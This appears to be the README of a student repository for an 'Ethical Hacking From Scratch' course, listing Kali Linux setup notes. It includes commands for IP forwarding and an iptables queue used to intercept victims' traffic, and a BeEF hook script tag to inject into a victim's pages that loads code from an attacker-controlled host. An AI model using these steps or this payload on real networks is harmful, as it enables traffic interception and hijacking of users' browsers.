# EthicalHackingCourse
Repository for all the code related to Learn Python &amp; "Ethical Hacking From Scratch" course.
All the work is done on Kali Linux, using both Python 2.7 and 3.x version.

## Requirements
Besides the needed libraries stated in *requirements.txt* file,
BeEF framework for Kali Linux is Required.

`sudo apt-get install beef-xss`

## Guidelines

### Kali Linux
To enable **IP forwarding**, enter the following command into the terminal:

`echo 1 > /proc/sys/net/ipv4/ip_forward`

To create **net filter queue** (*iptables*), enter the following command:

`iptables -I FORWARD -j NFQUEUE --queue-num <number>`,

where the default `<number>` is `0`.

For local testing, use both `OUTPUT` and `INPUT` chain.

To enable a basic HTTP server, type:

`sudo service apache2 start`

### Python
It seems that *netfilterqueue* does not work on Python 3.x.

### BeEF
The code we want to inject into our victim is:

`<script src="http://<IP>:3000/hook.js"></script`,

where `<IP>` is the IP of your host server containing *hook.js*.
